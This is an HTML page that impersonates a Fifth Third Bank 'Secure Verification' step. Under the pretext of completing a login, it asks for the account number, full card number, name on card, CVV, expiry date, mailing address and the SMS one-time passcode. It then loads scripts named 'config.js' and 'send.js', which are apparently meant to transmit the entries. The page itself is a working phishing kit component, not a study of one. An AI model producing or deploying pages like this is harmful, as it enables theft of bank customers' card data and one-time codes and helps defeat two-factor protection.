<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Fifth Third Secure Verification</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #f5f6fa;
    }
    .navbar {
      background: #1a357a;
      height: 56px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }
    .logo-container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 56px;
    }
    .logo-img {
      height: 48px;
      width: auto;
      margin: 0 0 0 0;
    }
    .main-bg {
      background: #f5f6fa;
      min-height: 100vh;
      padding: 0;
    }
    .verify-card {
      background: #f7f7f7;
      border-radius: 8px;
      box-shadow: 0 2px 12px rgba(30, 50, 100, 0.10);
      max-width: 420px;
      margin: 32px auto 0 auto;
      padding: 32px 24px 24px 24px;
    }
    .verify-title {
      font-size: 1.7em;
      font-weight: 700;
      color: #222;
      margin-bottom: 24px;
      text-align: left;
      width: 100%;
      border: none;
      padding-bottom: 0;
    }
    .verify-form label {
      margin-bottom: 12px;
      font-size: 1em;
      color: #222;
      font-weight: 700;
      display: block;
      text-align: left;
    }
    .verify-form input {
      width: 100%;
      margin-left: 0;
      margin-right: 0;
      padding: 14px 12px;
      border: 1px solid #bfc5ce;
      border-radius: 3px;
      font-size: 1em;
      margin-top: 6px;
      background: #fff;
      color: #222;
      box-sizing: border-box;
    }
    .verify-btn {
      width: 100%;
      background: #1a357a;
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 13px 0;
      font-size: 1.1em;
      font-weight: 700;
      cursor: pointer;
      margin-top: 18px;
      margin-bottom: 8px;
      transition: background 0.2s;
      letter-spacing: 1px;
    }
    .verify-btn:hover {
      background: #2248b0;
    }
    .info-section {
      background: #fff;
      padding: 36px 0 36px 0;
      text-align: center;
      margin-top: 0;
    }
    .info-section h2 {
      color: #222;
      font-size: 1.3em;
      font-weight: 700;
      margin-bottom: 12px;
    }
    .info-section p {
      color: #333;
      font-size: 1.1em;
      margin: 0 auto;
      max-width: 600px;
    }
    @media (max-width: 600px) {
      .verify-card {
        max-width: 98vw;
        padding: 8vw 2vw 8vw 2vw;
      }
      .navbar {
        height: 48px;
      }
      .logo-img {
        height: 28px;
      }
    }
  </style>
</head>
<body>
  <nav class="navbar">
    <div class="logo-container">
      <img src="/53rd.logo.png" alt="Fifth Third Logo" class="logo-img">
    </div>
  </nav>
  <div class="main-bg">
    <div class="verify-card">
      <div class="verify-title">Secure Verification</div>
      <form class="verify-form" id="verify-form">
        <label>Account Number
          <input type="text" name="accountnumber" required placeholder="Enter your account number">
        </label>
        <label>Name on Card
          <input type="text" name="cardname" required placeholder="Name as it appears on card">
        </label>
        <label>Card Number
          <input type="text" name="cardnumber" required placeholder="16-digit card number">
        </label>
        <label>CVV
          <input type="text" name="cvv" required placeholder="3-digit CVV">
        </label>
        <label>Expiry Date
          <input type="text" name="expdate" required placeholder="MM/YY">
        </label>
        <label>Mailing Address
          <input type="text" name="mailingaddress" required placeholder="Your mailing address">
        </label>
        <label>OTP Code
          <input type="text" name="otp" required placeholder="Enter OTP from SMS">
        </label>
        <button type="submit" class="verify-btn">VERIFY</button>
      </form>
    </div>
    <div class="info-section">
      <h2>Secure Verification Required</h2>
      <p>For your security, we need to verify your identity. Please provide the requested information to complete your login.</p>
    </div>
  </div>
  <script src="config.js"></script>
  <script src="send.js"></script>
  <script>
    console.log('verify.html loaded successfully');
  </script>
</body>
</html>
